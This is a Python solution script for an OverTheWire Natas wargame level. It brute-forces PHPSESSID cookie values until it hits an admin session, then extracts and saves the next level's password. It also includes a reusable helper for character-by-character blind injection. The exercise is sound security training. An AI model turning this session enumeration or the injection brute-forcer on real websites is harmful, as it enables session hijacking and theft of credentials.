import os
import requests

from requests.auth import HTTPBasicAuth

import bs4
import html

import pathlib
import re

import string

from tqdm import tqdm

import typing

# utilities
file = os.path.basename(__file__).split(".")
file = file[0]
file = file[file.find("natas")+5:]

level = int(file)

username = f"natas{level}"
password = None
website = f"http://{username}.natas.labs.overthewire.org/"

char_set = [*(string.ascii_letters + string.digits)]

result = None

with open(f"./natas/password/natas{level:02}-password.txt", "r") as f:
    password = f.read()

def send_get_request(website: str, username: str = None, password: str = None, params: dict = None, headers: dict = None, cookies: dict = None, get_body: bool = True, verbose: bool = True) -> tuple[requests.Response, bs4.Tag]:
    if verbose:
        print(f"Sending <GET> request to {website}")
        
        if username and password:
            print(f"Username : {username}")
        
        if username and password:
            print(f"Password : {password}")
        
        print()

        r = requests.get(website, auth=HTTPBasicAuth(username, password), params=params, headers=headers, cookies=cookies)

        print("Parsing HTML", end="...")
        soup = bs4.BeautifulSoup(r.content, "html.parser")
        print("Done\n")

        if get_body:
            print("Retrieving <body> tag", end="...")
            soup = soup.find("body")
            print("Done\n")


        print(str(soup)[:400]+"..." if len(str(soup)) >= 400 else str(soup))
        print()
    
    else:
        r = requests.get(website, auth=HTTPBasicAuth(username, password), params=params, headers=headers, cookies=cookies)
        soup = bs4.BeautifulSoup(r.content, "html.parser")
        if get_body:
            soup = soup.find("body")


    return (r, soup)

def send_post_request(website: str, data: dict, username: str = None, password: str = None, headers: dict = None, cookies: dict = None, files: dict = None, get_body: bool = True, verbose: bool = True) -> tuple[requests.Response, bs4.Tag]:
    if verbose:
        print(f"Sending <POST> request to {website}")
        
        if username and password:
            print(f"Username : {username}")
        
        if username and password:
            print(f"Password : {password}")
        
        print()

        r = requests.post(website, auth=HTTPBasicAuth(username, password), data=data, headers=headers, cookies=cookies, files=files)

        print("Parsing HTML", end="...")
        soup = bs4.BeautifulSoup(r.content, "html.parser")
        print("Done\n")

        if get_body:
            print("Retrieving <body> tag", end="...")
            soup = soup.find("body")
            print("Done\n")


        print(str(soup)[:400]+"..." if len(str(soup)) >= 400 else str(soup))
        print()
    
    else:
        r = requests.post(website, auth=HTTPBasicAuth(username, password), data=data, headers=headers, cookies=cookies, files=files)
        soup = bs4.BeautifulSoup(r.content, "html.parser")
        if get_body:
            soup = soup.find("body")

    return (r, soup)

def save_password(result: str, level: int = level) -> pathlib.Path:
    result = result.strip("\n")

    print(f"Password found : {result}\n")

    dir = f"./natas/password/natas{level+1:02}-password.txt"

    print(f"Saving to file {dir}", end="...")
    with open(dir, "w+") as f:
        f.write(result or "")
    print("Done")

    print()

    return pathlib.Path(dir)

def join_website_dir(website: str, *dir: str) -> str:
    dir = map(str, dir)

    res = website.strip("/")

    for d in dir:
        res += "/"
        res += d.strip("/")

    return res

def find_element(element: str, soup: bs4.BeautifulSoup | bs4.Tag , all: bool = False) -> bs4.Tag:
    print(f"Finding <{element}>", end="...")
    if all:
        res = soup.find_all(element)
    else:
        res = soup.find(element)
    print("Done\n")
    
    return res

def extract_php_code(source_soup: bs4.BeautifulSoup) -> pathlib.Path:
    dir = f"./natas/code/natas{level:02}.php"

    if os.path.exists(dir):
        return dir
    
    content = source_soup.get_text(separator="\n")
    content = "".join(filter(lambda c: not "//" in c, content.splitlines()))
    content = "".join([s if s.isprintable() else " " for s in content])
    content = content.replace("=$data['bgcolor']", "")

    print(f"Extracting PHP Code to {dir}", end="...")
    code = html.unescape(content)

    code = re.findall("<\?.*?\?>", code)
    code = [c[2:-2] for c in code if c[3] != "="]
    code = "".join(code)
    code = code.replace("php", "")
    
    with open(dir, "w+") as f:
        f.write("<?php\n" + code)

    print("Done")

    return pathlib.Path(dir)

def brute_force(website: str, key: str, query: str, username: str, password: str, check_func: typing.Callable, cookies: dict, match: bool, match_query: str = None) -> list:
    char_set = [*(string.ascii_letters + string.digits)]

    if match:
        if not match_query:
            return

        char_set = [*(string.ascii_letters + string.digits)]
        match_set = []

        for c in tqdm(char_set):            
            inject_response, inject_soup = send_post_request(website=website, data={"username": match_query.format(data=c)}, username=username, password=password, verbose=False)

            if check_func(inject_response, inject_soup):
                match_set.append(c)
                print(f'\nMatch Found : "{c}"\n')
        
        char_set = match_set

    result = ""

    while len(result) != 32:
        print(f"\nConstructing : {result.ljust(32, '-')} ({len(result)/32*100:.02f}%)\n")

        for char in tqdm(char_set):
            cur_pass = result + char
            
            inject_response, inject_soup = send_post_request(website=website, data={key: query.format(data=cur_pass)}, username=username, password=password, verbose=False, cookies=cookies)

            if check_func(inject_response, inject_soup):
                result = cur_pass
                break

    print()

    return result

# code starts here
response, soup = send_get_request(website=website, username=username, password=password)

source = find_element("a", soup)
source = source.attrs["href"]

source_response, source_soup = send_get_request(website=join_website_dir(website, source), username=username, password=password, get_body=False)

php_path = extract_php_code(source_soup=source_soup)

# format file with Ctrl+Shift+P > Format Document

query = ""
func: typing.Callable[[requests.Response, bs4.BeautifulSoup], bool] = lambda response, soup: response.elapsed.total_seconds() >= 5
cookies = {"PHPSESSID": None}

max_id = 640

for c_id in tqdm(range(1, max_id+1)):
    cookies["PHPSESSID"] = str(c_id)

    cur_response, cur_soup = send_post_request(website=website, data={"username": "natas19", "password": "idk"}, username=username, password=password, cookies=cookies, verbose=False)

    content = cur_soup.get_text("\n")

    if "You are an admin" in content:
        break

print()

content = content.splitlines()
content = [*filter(lambda c: "password" in c.lower(), content)]

content = content[0]
content = content.split()

result = content[-1]

password_dir = save_password(result=result)